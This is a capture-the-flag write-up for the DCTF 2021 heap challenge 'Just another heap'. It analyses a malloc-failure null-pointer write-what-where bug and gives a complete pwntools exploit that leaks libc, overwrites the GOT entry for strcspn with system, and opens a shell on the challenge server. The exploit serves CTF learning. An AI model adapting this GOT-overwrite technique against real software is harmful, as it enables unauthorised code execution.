# DCTF 2021

## Just another heap

> 500  
>  
> There are so many ways you can pwn this.  
>  
> `nc dctf-chall-just-another-heap.westeurope.azurecontainer.io 7481`  
>  
> [just\_another\_heap](just_another_heap) [Dockerfile](Dockerfile)

Tags: _pwn_ _x86-64_ _malloc_ _null-pointer_ _heap_ _heap-not_ _write-what-
where_ _got-overwrite_

## Summary

IMHO, the simplest [portable] way to pwn this was to use a null-pointer +
offset to _write-what-where_ the GOT.

## Analysis

### Checksec

```  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

All of the pointers to the heap are in global arrays; the _no-PIE_ will be
helpful for that; same goes for the GOT as well (Partial RELRO = GOT
vulnerable to overwrite).

### Decompile with Ghidra

> All naming done by hand, there was nothing for free here (except libc
> labels).

```c  
     puts("name:");  
     uVar2 = local_38;  
     pvVar3 = malloc(0x20);  
     *(void **)(&memory_name_ptr_00602260 + uVar2 * 8) = pvVar3;  
     prompt_fgets(*(undefined8 *)(&memory_name_ptr_00602260 + local_38 * 8),0x10);  
     lVar1 = *(long *)(&memory_name_ptr_00602260 + local_38 * 8);  
     sVar4 = strcspn(*(char **)(&memory_name_ptr_00602260 + local_38 * 8),"\n");  
     *(undefined *)(sVar4 + lVar1) = 0;  
     puts("How long is your memory");  
     prompt_lu(&local_48);  
     local_30 = malloc(local_48);  
     puts("Sometimes our memories fade and we only remember parts of them.");  
     prompt_lu(&local_40);  
     puts("Would you like to leave some space at the beginning in case you remember later?");  
     if (local_48 < local_40) {  
       puts("Invalid offset");  
     }  
     else {  
       if (local_30 != (void *)0x0) {  
         local_4c = 0;  
         while ((ulong)(long)local_4c < local_40) {  
           *(undefined *)((long)local_30 + (long)local_4c) = 0x5f;  
           local_4c = local_4c + 1;  
         }  
       }  
       local_30 = (void *)((long)local_30 + local_40);  
       fflush(stdin);  
       puts("What would you like to write");  
       prompt_fgets(local_30,local_48 - local_40);  
       puts("Would you say this memory is important to you? [Y/N]");  
       prompt_fgets(local_24,2);  
```

This section of the `create` function contains the _write-what-where_ that
we'll use to setup a libc leak as well as overwrite the GOT for a shell.

The `local_30 = malloc(local_48);` statement with a sufficiently large input
(`local_48`) will fail and end up as zero (null), with the only check for this
an initialization section (`if (local_30 != (void *)0x0) {`).

The `prompt_lu(&local_40);` statement sets our offset and is then used to
compute the target address with: `local_30 = (void *)((long)local_30 +
local_40);`.  The only input validation is `local_48 < local_40`; the length
of the initial length must be greater than the offset (both inputs are
`unsigned long`).

With this, we can set the length (`local_48`) to `2**64 - 1`, and `malloc`
will quietly fail setting `local_30` to `0`.  This ends up with `local_40`
containing the target location to overwrite.  We have our _where_.

The _what_ is provided by: `prompt_fgets(local_30,local_48 - local_40);`.
`prompt_fgets` is just a frontend to `fgets`, however we need to leverage that
`int param_2`:

```c  
void prompt_fgets(char *param_1,int param_2)  
{  
 printf("> ");  
 fgets(param_1,param_2,stdin);  
 return;  
}  
```

The `local_48 - local_40` passed to `fgets` is problematic, if `local_48` is
very large [to get `malloc` to return a null], and `local_40` is relatively
small (a valid address, say in the GOT (`0x600000` range)), then the
difference will be very large, `fgets` will call `malloc` and that `malloc`
will fail as well.

To get a reasonable [small] input for `fgets` we need to find the right value
of `local_48` reduced by `local_40` then _anded_ with `0xffffffff` (this is
the `int param_2` from `prompt_fgets`; we are calling a function with an
`unsigned long` as an input, however the function is expecting an `int`
(32-bit), so we can assume only the lower 32-bits will be used).

```python  
2**64 - 2**32 + target + size  
```

You can work out the math yourself, but this will properly set `local_48` and
`local_40` so that `malloc` nulls out, leaving our target address in
`local_40` to satisfy the _where_ (`local_30 = (void *)((long)local_30 +
local_40);`), and `local_48 - local_40` will just end up something like
`0xffffffff0000000a` that when reduced to 32-bits by `prompt_fgets` will be a
`size` of `0xa` in this example.

We have our _what_, now we just need a leak.

```c  
     pvVar3 = malloc(0x20);  
     *(void **)(&memory_name_ptr_00602260 + uVar2 * 8) = pvVar3;  
     prompt_fgets(*(undefined8 *)(&memory_name_ptr_00602260 + local_38 * 8),0x10);  
```

At the start of `create` we're prompted for a _name_ that is malloc'd and then
the pointer stored in a global array based at `0x602260`.

To leak libc all we need to do is use our _write-what-where_ to change that
pointer to point to some place in the GOT or BSS to pickup a libc leak.  The
`list` function emits the names and therefore our leak.

> The libc version was provided in the form of a `Dockerfile`.  I've included
> it (`libc.so.6`) as part of this writeup since a future update to Ubuntu
> 18.04 may change the version of libc.

## Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./just_another_heap')  
binary.symbols['names'] = 0x602260

if args.REMOTE:  
   p = remote('dctf-chall-just-another-heap.westeurope.azurecontainer.io',
7481)  
   libc = ELF('./libc.so.6')  
else:  
   import signal  
   p = process(('stdbuf -i0 -o0 -e0 '+binary.path).split(),preexec_fn=lambda:
signal.signal(signal.SIGALRM, signal.SIG_IGN))  
   libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  
```

Standard pwntools setup, however I added the symbol `names`, and have my local
process ignoring SIGALRM.

> No `setvbuf` in challenge binary, so I had to prepend `stdbuf`.

```python  
p.sendlineafter('> ','1')  
p.sendlineafter('> ','0')  
p.sendlineafter('> ','blah')  
p.sendlineafter('> ',str(2**64 - 2**32 + binary.sym.names + 10))  
p.sendlineafter('> ',str(binary.sym.names))  
p.sendlineafter('> ',p64(binary.got.puts))  
p.sendlineafter('> ','N')  
p.sendlineafter('> ','N')  
p.sendlineafter('> ','5')

p.recvuntil('0: ')  
puts = u64(p.recv(6) + b'\0\0')  
log.info('puts: ' + hex(puts))  
libc.address = puts - libc.sym.puts  
log.info('libc.address: ' + hex(libc.address))  
```

Based on the analysis above this should be fairly clear.  Just add an entry,
name it `blah`, but immediately overwrite its pointer with the location of GOT
`puts`, then `list` (`5`) and capture the leak.

```python  
p.sendlineafter('> ','1')  
p.sendlineafter('> ','1')  
p.sendlineafter('> ','blah')  
p.sendlineafter('> ',str(2**64 - 2**32 + binary.got.strcspn + 10))  
p.sendlineafter('> ',str(binary.got.strcspn))  
p.sendlineafter('> ',p64(libc.sym.system))  
p.sendlineafter('> ','N')  
p.sendlineafter('> ','N')  
```

Same as the previous, but this time change `strcspn` to `system` in the GOT.

```python  
p.sendlineafter('> ','1')  
p.sendlineafter('> ','2')  
p.sendlineafter('> ','/bin/sh')  
p.interactive()  
```

Finally, create a 3rd memory, but the `strcspn` that was used to replace the
`\n` with `\0` is now `system`, so just ask for a shell as your _name_.

Output:

```bash  
# ./exploit.py REMOTE=1  
[*] '/pwd/datajerk/dctf2021/just_another_heap/just_another_heap'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to dctf-chall-just-another-
heap.westeurope.azurecontainer.io on port 7481: Done  
[*] '/pwd/datajerk/dctf2021/just_another_heap/libc.so.6'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] puts: 0x7fd942288aa0  
[*] libc.address: 0x7fd942208000  
[*] Switching to interactive mode  
$ id  
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)  
$ cat flag.txt  
dctf{I_h4V3_0_id3a_h0W_y0u_G0T_h3r3}  
```  

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/dctf2021/just_another_heap).